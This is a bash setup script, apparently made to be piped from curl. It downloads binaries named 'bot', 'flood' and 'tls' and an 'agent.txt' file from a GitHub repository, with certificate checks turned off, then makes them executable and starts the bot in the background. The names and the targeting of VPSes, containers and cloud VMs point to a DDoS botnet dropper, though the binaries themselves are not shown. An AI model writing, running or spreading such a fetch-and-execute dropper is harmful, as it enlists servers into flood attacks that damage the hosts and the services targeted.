#!/bin/bash
# ==============================================================================
# Setup Bots Script - One-Liner (curl ... | bash)
# Supports Linux VPS, Servers, Containers, Pterodactyl & Cloud VMs
# ==============================================================================

set -e

REPO_BASE="https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main"

echo "=================================================="
echo "         Initializing Bot Setup                  "
echo "=================================================="

# Determine architecture
ARCH=$(uname -m 2>/dev/null || echo "x86_64")
echo "[*] System Architecture : ${ARCH}"

case "${ARCH}" in
    x86_64|amd64)
        BIN_ARCH="x86_64"
        ;;
    aarch64|arm64|armv8*)
        BIN_ARCH="aarch64"
        ;;
    arm*|armv7*|armhf|armeabi*)
        BIN_ARCH="armv7l"
        ;;
    i*86|x86)
        BIN_ARCH="x86"
        ;;
    *)
        BIN_ARCH="x86_64"
        ;;
esac

# Helper download function
download_file() {
    URL="$1"
    DEST="$2"
    TS=$(date +%s 2>/dev/null || echo 1)
    if command -v curl >/dev/null 2>&1; then
        curl -s -k -L "${URL}?t=${TS}" -o "${DEST}"
    elif command -v wget >/dev/null 2>&1; then
        wget -q --no-check-certificate "${URL}?t=${TS}" -O "${DEST}"
    else
        echo "[!] Error: Neither curl nor wget is available."
        return 1
    fi
}

echo "[*] Downloading components..."
download_file "${REPO_BASE}/bots/bot-${BIN_ARCH}" "bot" || download_file "${REPO_BASE}/bots/bot" "bot"
download_file "${REPO_BASE}/bots/flood-${BIN_ARCH}" "flood" || download_file "${REPO_BASE}/bots/flood" "flood"
download_file "${REPO_BASE}/bots/tls/tls-${BIN_ARCH}" "tls" || download_file "${REPO_BASE}/bots/tls/tls" "tls" || true
download_file "${REPO_BASE}/agent.txt" "agent.txt" || true

chmod +x bot flood tls 2>/dev/null || true

# Kill old bot instance if running
pkill -f "./bot" 2>/dev/null || true

echo "[+] Components downloaded successfully!"
echo "[+] Starting bot..."

# If inside Pterodactyl / Node container where node is available and index.js exists
if [ -f "index.js" ] && command -v node >/dev/null 2>&1; then
    exec node index.js
else
    # Start bot in background or foreground depending on environment
    ./bot &
    BOT_PID=$!
    echo "[+] Bot running in background with PID: ${BOT_PID}"
    echo "=================================================="
    echo "         Bot Setup Complete & Active              "
    echo "=================================================="
fi
